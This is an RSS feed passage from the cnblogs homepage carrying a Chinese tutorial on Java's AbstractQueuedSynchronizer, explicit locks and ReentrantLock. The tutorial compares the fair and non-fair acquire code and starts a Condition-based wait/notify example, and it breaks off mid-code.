<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>java之AQS和显式锁 - 白我少年头</title>
<link>http://www.cnblogs.com/hongshaodian/p/12452136.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hongshaodian/p/12452136.html</guid>
<description>&lt;h3&gt;&lt;span&gt;　　本次内容主要介绍AQS、AQS的设计及使用、&lt;span lang=&quot;EN-US&quot;&gt;ReentrantLock、&lt;/span&gt;ReentrantReadWriteLock以及手写一个可重入独占锁&lt;/span&gt;&lt;/h3&gt;
&lt;h2&gt; &lt;/h2&gt;
&lt;h2&gt;&lt;span&gt;1、什么是AQS&lt;/span&gt;&lt;span&gt;？&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt; 　　&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;QS，队列同步器AbstractQueuedSynchronizer的简写，JDK1.5引入的，&lt;/span&gt;&lt;/span&gt;&lt;span&gt;是用来构建锁或者其他同步组件的基础框架，它使用了一个int成员变量表示同步状态，通过内置的FIFO队列来完成资源获取线程的排队工作。AQS的作者Doug Lea大师期望它能够成为实现大部分同步需求的基础。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;2、AQS的设计及其作用&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt; 　　&lt;span&gt;AbstractQueuedSynchronizer是一个抽象类，先看一下其类图。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200318110452330-1659494460.png&quot; alt=&quot;&quot; width=&quot;532&quot; height=&quot;399&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　AQS中里有一个volatile修饰int型的state来代表同步状态，使用同步器提供的3个方法（getState()、setState(int newState)和compareAndSetState(int expect,int update)）来改变状态，因为它们能够保证状态的改变是安全的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　AQS使用的是模板方法模式，主要使用方式是继承，且通常将子类推荐定义为静态内部类，子类通过继承AQS并实现它的抽象方法来管理同步状态。AQS自身没有实现任何同步接口，它仅仅是定义了若干同步状态获取和释放的方法来供自定义同步组件使用，同步器既可以支持独占式地获取同步状态，也可以支持共享式地获取同步状态，这样就可以方便实现不同类型的同步组件（ReentrantLock、ReentrantReadWriteLock和CountDownLatch等）。&lt;/span&gt;&lt;span&gt;AQS是实现锁（也可以是任意同步组件）的关键，在锁的实现中聚合同步器。可以这样理解二者之间的关系：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;锁是面向使用者的，它定义了使用者与锁交互的接口（比如可以允许两个线程并行访问），隐藏了实现细节&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;同步器面向的是锁的实现者，它简化了锁的实现方式，屏蔽了同步状态管理、线程的排队、等待与唤醒等底层操作。锁和同步器很好地隔离了使用者和实现者所需关注的领域。实现者需要继承同步器并重写指定的方法，随后将同步器组合在自定义同步组件的实现中，并调用同步器提供的模板方法，而这些模板方法将会调用使用者重写的方法。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt; 　　&lt;/span&gt;&lt;span&gt;&lt;span&gt;实现自定义同步组件时，将会调用AQS提供的模板方法，AQS的模板方法如下：&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200318162233532-1619197314.png&quot; alt=&quot;&quot; width=&quot;767&quot; height=&quot;467&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　AQS提供的模板方法基本上分为3类：独占式获取与释放同步状态、共享式获取与释放同步状态和查询同步队列中的等待线程情况。AQS中可重写的方法如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200318164707542-9140521.png&quot; alt=&quot;&quot; width=&quot;729&quot; height=&quot;367&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　AQS中有一个内部类Node，用于构造一个队列来保存排队等待获取锁的线程。看一下Node的源码及其简单说明：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Node {
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;标记线程是因为获取共享资源失败被阻塞添加到队列中的&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Node SHARED = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Node();

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示线程因为获取独占资源失败被阻塞添加到队列中的&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Node EXCLUSIVE = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示线程因为中断或者等待超时，需要从等待队列中取消等待&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; CANCELLED =  1&lt;span&gt;;
        
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示当前线程占有锁，队列中没有存放线程引用头结点的后继结点A处于等待状态，
        * 如果已占有锁的线程释放锁或被CANCEL之后就会通知结点A去获取锁。&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; SIGNAL    = -1&lt;span&gt;;
    
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;当持有锁的线程调用了Condition（下面会讲到具体运用）的signal()方法之后，处于同一condition下的等待线程会去竞争锁&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; CONDITION = -2&lt;span&gt;;
     
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示把waitStatus的值，指示下一个acquireShared应该无条件传播&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; PROPAGATE = -3&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示当前线程的等待状态&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;volatile&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; waitStatus;
   
        &lt;/span&gt;&lt;span&gt;volatile&lt;/span&gt;&lt;span&gt; Node prev;

        &lt;/span&gt;&lt;span&gt;volatile&lt;/span&gt;&lt;span&gt; Node next;
        
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;表示进入AQS队列中的线程引用&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;volatile&lt;/span&gt;&lt;span&gt; Thread thread;
        Node nextWaiter;

        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isShared() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; nextWaiter ==&lt;span&gt; SHARED;
        }

      
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Node predecessor() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; NullPointerException {
            Node p &lt;/span&gt;=&lt;span&gt; prev;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (p == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NullPointerException();
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt; p;
        }

        Node() {    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Used to establish initial head or SHARED marker&lt;/span&gt;
&lt;span&gt;        }

        Node(Thread thread, Node mode) {     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Used by addWaiter&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.nextWaiter =&lt;span&gt; mode;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.thread =&lt;span&gt; thread;
        }

        Node(Thread thread, &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; waitStatus) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Used by Condition&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.waitStatus =&lt;span&gt; waitStatus;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.thread =&lt;span&gt; thread;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　&lt;span&gt;AQS基础内容先了解这么多，后面会用AQS实现一个自己的可重入独占式锁。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;3、显式锁Lock&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt; &lt;span&gt;　　与使用关键字synchronized相比，显式锁Lock提供了更广泛的加锁操作。 Lock获取锁的方法更加灵活，并且支持多个关联的Condition对象，先看一下Lock的常用API：&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200318175445802-351239880.png&quot; alt=&quot;&quot; width=&quot;631&quot; height=&quot;335&quot;/&gt;&lt;span&gt;与关键字synchronized相比，Lock有以下几个优势：&lt;br/&gt;（1）可以尝试非阻塞地获取锁，如果这一时刻锁没有被其他线程获取到，则成功获取并持有锁。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;（2）获取锁过程中可以被中断。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;（3）超时获取锁，可以指定一个时间，在指定的时间范围内获取锁，如果截止时间到了仍然无法获取锁，则返回，可以避免线程长时间阻塞。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;Lock也有缺点，比如说必须手动的释放锁，所以在使用Lock时有一个范式，以&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;ReentrantLock为例：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; X {
   &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; ReentrantLock lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReentrantLock();
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ...&lt;/span&gt;

   &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; m() {
     lock.lock();  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; block until condition holds&lt;/span&gt;
     &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ... method body&lt;/span&gt;
     } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
       lock.unlock()
     }
   }
 }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　 还有一个要注意的地方是，不要将获取锁的过程写在try块中，因为如果在获取锁（自定义锁的实现）时发生了异常，异常抛出的同时，也会导致锁无故释放。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;4、&lt;span lang=&quot;EN-US&quot;&gt;ReentrantLock&lt;/span&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;4.1 公平锁和非公平锁&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt; 　　ReentrantLock是可重入的互斥锁，与使用synchronized修饰的方法和代码块具有相同的基本行为和语义，但具有扩展的功能。最明显的一个扩展功能是ReentrantLock可以定义为公平锁或非公平锁，synchronized内部实现使用的是非公平锁机制。从时间上来说，先对锁进行获取的请求一定先被满足，那么这个锁是公平的，反之是不公平的。 ReentrantLock提供了一个构造函数，能够控制锁是否是公平的。事实上，公平的锁机制往往没有非公平的效率高，原因如下：&lt;/span&gt;&lt;span&gt;在激烈竞争的情况下，恢复一个被挂起的线程与该线程真正开始运行之间存在着严重的延迟。假设线程A持有一个锁，并且线程B请求这个锁。由于这个锁已被线程A持有，因此B将被挂起。当A释放锁时，B将被唤醒，因此会再次尝试获取锁。与此同时，如果C也请求这个锁，那么C很可能会在B被完全唤醒之前获得、使用以及释放这个锁。这样的情况是一种“双赢”的局面，B获得锁的时刻并没有推迟，C更早地获得了锁，并且吞吐量也获得了提高，用一张图来说明。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200320094341911-60971224.png&quot; alt=&quot;&quot; width=&quot;601&quot; height=&quot;297&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们可以去看下公平锁和非公平锁加锁的源码，区别其实非常小，先看非公平锁：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; nonfairTryAcquire(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; acquires) {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;             &lt;span&gt;final&lt;/span&gt; Thread current =&lt;span&gt; Thread.currentThread();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;             &lt;span&gt;int&lt;/span&gt; c =&lt;span&gt; getState();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (c == 0&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (compareAndSetState(0&lt;span&gt;, acquires)) {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;                    setExclusiveOwnerThread(current);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;                     &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;             &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (current ==&lt;span&gt; getExclusiveOwnerThread()) {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                 &lt;span&gt;int&lt;/span&gt; nextc = c +&lt;span&gt; acquires;
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (nextc &amp;lt; 0) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; overflow&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt;                     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Error(&quot;Maximum lock count exceeded&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;                setState(nextc);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;再看公平锁：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;    &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; tryAcquire(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; acquires) {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;             &lt;span&gt;final&lt;/span&gt; Thread current =&lt;span&gt; Thread.currentThread();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;             &lt;span&gt;int&lt;/span&gt; c =&lt;span&gt; getState();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (c == 0&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;!hasQueuedPredecessors() &lt;/span&gt;&amp;amp;&amp;amp;
&lt;span&gt; 6&lt;/span&gt;                     compareAndSetState(0&lt;span&gt;, acquires)) {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;                    setExclusiveOwnerThread(current);
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;                     &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;             &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (current ==&lt;span&gt; getExclusiveOwnerThread()) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;int&lt;/span&gt; nextc = c +&lt;span&gt; acquires;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (nextc &amp;lt; 0&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;                     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Error(&quot;Maximum lock count exceeded&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;                setState(nextc);
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　通过对比源码可以发现，公平锁在第5行的判断条件里多了一个!hasQueuedPredecessors()，这个的意思是查询是否有线程在排队等待获取锁，如果有线程在排队，则不去抢锁。而非公平锁才不管你有没有线程在排队等待，直接去抢一次再说，不管抢不抢的到。&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;4.2 ReentrantLock使用&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　&lt;/span&gt;&lt;span&gt;隔壁老王在某宝买了一个FBB版的娃娃，假设娃娃从广东发出，目的是上海，距离大约1500公里。娃娃发出后，在离目的地小于100公里的时候给老王发短信说，你的娃娃快到了。在上海的快递员接到娃娃后，会给老王打电话让他来取娃娃。这是一个典型的等待/通知机制，在之前的篇幅中我们使用Object类中的wait()和notifyAll()等待通知机制实现了一个自己的数据库连接池，现在使用&lt;/span&gt;&lt;span&gt;ReentrantLock来模拟刚刚老王买娃娃的场景。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;业务实现代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Condition;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Lock;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.ReentrantLock;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BuyFBBWawa {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; String DESTINATION = &quot;Shanghai&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;娃娃剩余运输里程数&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; km;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;娃娃当前位置&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String site;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; Lock lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReentrantLock();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;距离Condition&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; Condition kmCondition =&lt;span&gt; lock.newCondition();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;位置Condition&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; Condition siteCondition =&lt;span&gt; lock.newCondition();
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; BuyFBBWawa() {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; BuyFBBWawa(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; km, String site) {
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.km =&lt;span&gt; km;
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.site =&lt;span&gt; site;
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;26&lt;/span&gt; &lt;span&gt;     * 距离目的地小于100公里，通知处于wait状态并需要给老王发送短信的线程工作
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; changeKm() {
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;        lock.lock();
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;             &lt;span&gt;this&lt;/span&gt;.km = 99&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;             kmCondition.signal();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;通知其他在kmCondition上等待的线程&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; &lt;span&gt;            lock.unlock();
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;39&lt;/span&gt; &lt;span&gt;     * 到达菜鸟驿站，通知处于wait状态并需要给老王打电话的线程工作
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;41&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; changeSite() {
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt; &lt;span&gt;        lock.lock();
&lt;/span&gt;&lt;span&gt;43&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt;             &lt;span&gt;this&lt;/span&gt;.site = &quot;Shanghai&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;             siteCondition.signal();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;通知其他在siteCondition上等待的线程&lt;/span&gt;
&lt;span&gt;46&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt; &lt;span&gt;            lock.unlock();
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt; 
&lt;span&gt;51&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;52&lt;/span&gt; &lt;span&gt;     * 当娃娃的剩余里程数小于100时给老王发短信
&lt;/span&gt;&lt;span&gt;53&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;54&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; waitKm() {
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt; &lt;span&gt;        lock.lock();
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt;             &lt;span&gt;while&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.km &amp;gt;= 100&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;58&lt;/span&gt;                 &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
